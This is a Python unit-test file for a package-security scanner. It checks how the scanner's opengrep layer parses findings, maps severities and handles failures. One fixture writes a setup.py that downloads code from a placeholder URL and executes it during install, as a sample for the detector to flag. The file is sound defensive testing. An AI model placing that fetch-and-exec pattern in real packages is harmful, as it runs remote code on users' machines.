# SPDX-License-Identifier: AGPL-3.0-or-later
"""Unit tests for the opengrep static-analysis layer.

These tests monkeypatch subprocess.run inside the analyzer module so they
do not require the real opengrep binary on PATH. Rule-validation tests
(which DO need the binary) live in test_opengrep_rules_compile.py.
"""
from __future__ import annotations

import json
import subprocess
from pathlib import Path
from typing import Any

import pytest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _stub_intel_with_opengrep_dir(monkeypatch, tmp_path: Path) -> Path:
    """Point intel.current() at a pack containing one opengrep rule dir."""
    from pkgsentry import intel
    from pkgsentry.intel.pack import IntelPack

    og_dir = tmp_path / "intel_opengrep" / "python"
    og_dir.mkdir(parents=True)
    pack = IntelPack(opengrep_dirs=[og_dir.parent])

    monkeypatch.setattr(intel, "current", lambda: pack)
    return og_dir.parent


def _stub_intel_no_opengrep(monkeypatch) -> None:
    from pkgsentry import intel
    from pkgsentry.intel.pack import IntelPack

    monkeypatch.setattr(intel, "current", lambda: IntelPack())


def _fake_run_returning(json_payload: dict[str, Any]):
    """Build a fake subprocess.run that returns CompletedProcess with the
    given JSON in stdout."""

    def _run(cmd, *args, **kwargs):
        return subprocess.CompletedProcess(
            args=cmd, returncode=0, stdout=json.dumps(json_payload), stderr=""
        )

    return _run


def _fake_run_raising(exc):
    def _run(cmd, *args, **kwargs):
        raise exc

    return _run


def _make_extracted_pkg(tmp_path: Path) -> Path:
    """Minimal extracted package layout: one setup.py file."""
    root = tmp_path / "extracted"
    root.mkdir()
    (root / "setup.py").write_text(
        "from urllib.request import urlopen\nexec(urlopen('http://x').read())\n",
        encoding="utf-8",
    )
    return root


def _opengrep_result(
    *,
    check_id: str = "setup_net_to_exec",
    path: str = "setup.py",
    line: int = 2,
    severity: str = "ERROR",
    metadata: dict[str, Any] | None = None,
    message: str = "network-tainted exec at install time",
) -> dict[str, Any]:
    extra: dict[str, Any] = {"message": message, "severity": severity}
    if metadata is not None:
        extra["metadata"] = metadata
    return {
        "check_id": check_id,
        "path": path,
        "start": {"line": line, "col": 1},
        "end": {"line": line, "col": 30},
        "extra": extra,
    }


# ---------------------------------------------------------------------------
# Disabled / missing-binary / no-rules paths
# ---------------------------------------------------------------------------


def test_analyzer_returns_empty_when_disabled(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "0")
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    findings = opengrep_scan.analyze_opengrep(_make_extracted_pkg(tmp_path))
    assert findings == []


def test_analyzer_returns_empty_when_binary_missing(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_BIN", str(tmp_path / "nonexistent_opengrep"))
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    findings = opengrep_scan.analyze_opengrep(_make_extracted_pkg(tmp_path))
    assert findings == []


def test_analyzer_returns_empty_when_no_rule_dirs(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    _stub_intel_no_opengrep(monkeypatch)
    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    # subprocess.run must never be called when there are no rule dirs
    monkeypatch.setattr(
        opengrep_scan.subprocess, "run", _fake_run_raising(AssertionError("must not run")),
    )
    findings = opengrep_scan.analyze_opengrep(_make_extracted_pkg(tmp_path))
    assert findings == []


# ---------------------------------------------------------------------------
# Happy path: JSON parsing → Finding
# ---------------------------------------------------------------------------


def test_parses_json_output_to_finding(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_SHADOW", "0")
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    extracted = _make_extracted_pkg(tmp_path)

    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    # Pretend the binary exists.
    monkeypatch.setattr(opengrep_scan, "_check_binary", lambda: True)
    payload = {
        "results": [
            _opengrep_result(
                check_id="setup_net_to_exec",
                path=str(extracted / "setup.py"),
                line=2,
                severity="ERROR",
                metadata={"severity": "critical", "confidence": "high", "category": "installer"},
            )
        ],
        "errors": [],
    }
    monkeypatch.setattr(opengrep_scan.subprocess, "run", _fake_run_returning(payload))

    findings = opengrep_scan.analyze_opengrep(extracted, ecosystem="pypi")
    assert len(findings) == 1
    f = findings[0]
    assert f.rule_id == "opengrep.setup_net_to_exec"
    assert f.category == "installer"
    assert f.severity == "critical"
    assert f.confidence == "high"
    assert f.file == "setup.py"  # relative to extracted root
    assert f.line == 2
    assert "network-tainted exec" in f.evidence


def test_shadow_mode_prefixes_rule_id(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_SHADOW", "1")
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    extracted = _make_extracted_pkg(tmp_path)

    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    monkeypatch.setattr(opengrep_scan, "_check_binary", lambda: True)
    payload = {
        "results": [
            _opengrep_result(
                check_id="setup_net_to_exec",
                path=str(extracted / "setup.py"),
                metadata={"severity": "critical", "confidence": "high"},
            )
        ],
        "errors": [],
    }
    monkeypatch.setattr(opengrep_scan.subprocess, "run", _fake_run_returning(payload))

    findings = opengrep_scan.analyze_opengrep(extracted)
    assert len(findings) == 1
    assert findings[0].rule_id == "opengrep.shadow_setup_net_to_exec"


def test_shadow_mode_is_default(tmp_path, monkeypatch):
    """When OPENGREP_SHADOW is unset, default must be shadow=on for prod safety."""
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.delenv("OPENGREP_SHADOW", raising=False)
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    extracted = _make_extracted_pkg(tmp_path)

    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    monkeypatch.setattr(opengrep_scan, "_check_binary", lambda: True)
    payload = {
        "results": [_opengrep_result(check_id="setup_net_to_exec", path=str(extracted / "setup.py"))],
        "errors": [],
    }
    monkeypatch.setattr(opengrep_scan.subprocess, "run", _fake_run_returning(payload))

    findings = opengrep_scan.analyze_opengrep(extracted)
    assert findings[0].rule_id.startswith("opengrep.shadow_")


# ---------------------------------------------------------------------------
# Severity / confidence normalization
# ---------------------------------------------------------------------------


def test_metadata_severity_takes_precedence_over_opengrep_top_level(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_SHADOW", "0")
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    extracted = _make_extracted_pkg(tmp_path)

    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    monkeypatch.setattr(opengrep_scan, "_check_binary", lambda: True)
    payload = {
        "results": [
            _opengrep_result(
                check_id="r",
                path=str(extracted / "setup.py"),
                severity="WARNING",
                metadata={"severity": "critical", "confidence": "high"},
            )
        ],
        "errors": [],
    }
    monkeypatch.setattr(opengrep_scan.subprocess, "run", _fake_run_returning(payload))
    findings = opengrep_scan.analyze_opengrep(extracted)
    assert findings[0].severity == "critical"


def test_missing_metadata_severity_falls_back_to_top_level_mapping(tmp_path, monkeypatch):
    """ERROR → high, WARNING → medium, INFO → low — matches scoring scale."""
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_SHADOW", "0")
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    extracted = _make_extracted_pkg(tmp_path)

    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    monkeypatch.setattr(opengrep_scan, "_check_binary", lambda: True)
    payload = {
        "results": [
            _opengrep_result(check_id="a", path=str(extracted / "setup.py"), severity="ERROR"),
            _opengrep_result(check_id="b", path=str(extracted / "setup.py"), severity="WARNING"),
            _opengrep_result(check_id="c", path=str(extracted / "setup.py"), severity="INFO"),
        ],
        "errors": [],
    }
    monkeypatch.setattr(opengrep_scan.subprocess, "run", _fake_run_returning(payload))
    findings = opengrep_scan.analyze_opengrep(extracted)
    by_id = {f.rule_id: f for f in findings}
    assert by_id["opengrep.a"].severity == "high"
    assert by_id["opengrep.b"].severity == "medium"
    assert by_id["opengrep.c"].severity == "low"


def test_invalid_severity_normalizes_to_medium(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_SHADOW", "0")
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    extracted = _make_extracted_pkg(tmp_path)

    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    monkeypatch.setattr(opengrep_scan, "_check_binary", lambda: True)
    payload = {
        "results": [
            _opengrep_result(
                check_id="r",
                path=str(extracted / "setup.py"),
                severity="WEIRD",
                metadata={"severity": "bogus", "confidence": "bogus"},
            )
        ],
        "errors": [],
    }
    monkeypatch.setattr(opengrep_scan.subprocess, "run", _fake_run_returning(payload))
    findings = opengrep_scan.analyze_opengrep(extracted)
    assert findings[0].severity == "medium"
    assert findings[0].confidence == "medium"


# ---------------------------------------------------------------------------
# changed_files filter
# ---------------------------------------------------------------------------


def test_changed_files_filter_drops_results_outside_set(tmp_path, monkeypatch):
    """Code-diff scans must not report findings in files that did not change."""
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_SHADOW", "0")
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)

    extracted = tmp_path / "extracted"
    extracted.mkdir()
    (extracted / "changed.py").write_text("pass\n", encoding="utf-8")
    (extracted / "unchanged.py").write_text("pass\n", encoding="utf-8")

    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    monkeypatch.setattr(opengrep_scan, "_check_binary", lambda: True)
    payload = {
        "results": [
            _opengrep_result(check_id="r1", path=str(extracted / "changed.py")),
            _opengrep_result(check_id="r2", path=str(extracted / "unchanged.py")),
        ],
        "errors": [],
    }
    monkeypatch.setattr(opengrep_scan.subprocess, "run", _fake_run_returning(payload))

    findings = opengrep_scan.analyze_opengrep(extracted, changed_files={"changed.py"})
    assert {f.rule_id for f in findings} == {"opengrep.r1"}


# ---------------------------------------------------------------------------
# Failure modes
# ---------------------------------------------------------------------------


def test_subprocess_failure_returns_empty(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    extracted = _make_extracted_pkg(tmp_path)

    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    monkeypatch.setattr(opengrep_scan, "_check_binary", lambda: True)

    def _failed(cmd, *args, **kwargs):
        return subprocess.CompletedProcess(args=cmd, returncode=2, stdout="", stderr="boom")

    monkeypatch.setattr(opengrep_scan.subprocess, "run", _failed)
    findings = opengrep_scan.analyze_opengrep(extracted)
    assert findings == []


def test_timeout_returns_empty(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_TIMEOUT_SEC", "1")
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    extracted = _make_extracted_pkg(tmp_path)

    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    monkeypatch.setattr(opengrep_scan, "_check_binary", lambda: True)

    def _timeout(cmd, *args, **kwargs):
        raise subprocess.TimeoutExpired(cmd=cmd, timeout=1)

    monkeypatch.setattr(opengrep_scan.subprocess, "run", _timeout)
    findings = opengrep_scan.analyze_opengrep(extracted)
    assert findings == []


# ---------------------------------------------------------------------------
# Legacy-analyzer gating predicate (consumed by pipeline.py)
# ---------------------------------------------------------------------------


def test_replaces_install_analyzer_false_when_disabled(monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "0")
    from pkgsentry.analyze import opengrep_scan

    assert opengrep_scan.replaces_install_analyzer_for("pypi") is False
    assert opengrep_scan.replaces_install_analyzer_for("crates") is False


def test_replaces_install_analyzer_false_when_shadow(monkeypatch):
    """Shadow mode is the default; legacy analyzers MUST still run."""
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_SHADOW", "1")
    from pkgsentry.analyze import opengrep_scan

    assert opengrep_scan.replaces_install_analyzer_for("pypi") is False
    assert opengrep_scan.replaces_install_analyzer_for("crates") is False


def test_replaces_install_analyzer_true_in_cutover_for_migrated_ecosystems(monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_SHADOW", "0")
    from pkgsentry.analyze import opengrep_scan

    assert opengrep_scan.replaces_install_analyzer_for("pypi") is True
    assert opengrep_scan.replaces_install_analyzer_for("crates") is True


def test_replaces_install_analyzer_false_for_unmigrated_ecosystems(monkeypatch):
    """Go modules have no install-time hook — gating must be a no-op there."""
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    monkeypatch.setenv("OPENGREP_SHADOW", "0")
    from pkgsentry.analyze import opengrep_scan

    assert opengrep_scan.replaces_install_analyzer_for("gomod") is False


def test_malformed_json_returns_empty(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENGREP_ENABLED", "1")
    _stub_intel_with_opengrep_dir(monkeypatch, tmp_path)
    extracted = _make_extracted_pkg(tmp_path)

    from pkgsentry.analyze import opengrep_scan

    opengrep_scan._reset_caches_for_tests()
    monkeypatch.setattr(opengrep_scan, "_check_binary", lambda: True)

    def _bad_json(cmd, *args, **kwargs):
        return subprocess.CompletedProcess(args=cmd, returncode=0, stdout="not json{{{", stderr="")

    monkeypatch.setattr(opengrep_scan.subprocess, "run", _bad_json)
    findings = opengrep_scan.analyze_opengrep(extracted)
    assert findings == []
